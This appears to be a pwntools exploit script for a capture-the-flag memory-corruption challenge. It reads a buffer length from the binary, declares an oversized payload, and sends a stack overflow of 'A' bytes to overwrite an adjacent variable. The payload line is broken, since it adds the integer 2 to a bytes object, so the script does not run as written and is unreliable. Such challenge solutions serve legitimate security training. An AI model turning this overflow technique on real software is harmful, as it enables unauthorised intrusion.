#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF('/challenge/babymem_level1.0')
io = elf.process()

# Retrieve the buffer length from the program
io.recvuntil(b'The buffer is ')
buffer_length = int(io.recvuntil(b' ').decode())

# Send the payload size to the program.
# The payload size is equal to the buffer length + 2 (which is the variable dimension)
io.recvuntil(b'Payload size: ')
io.sendline(f"{buffer_length + 2}".encode())

# Build the payload to send to the program and send it
PAYLOAD = b'A'*buffer_length + 2
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())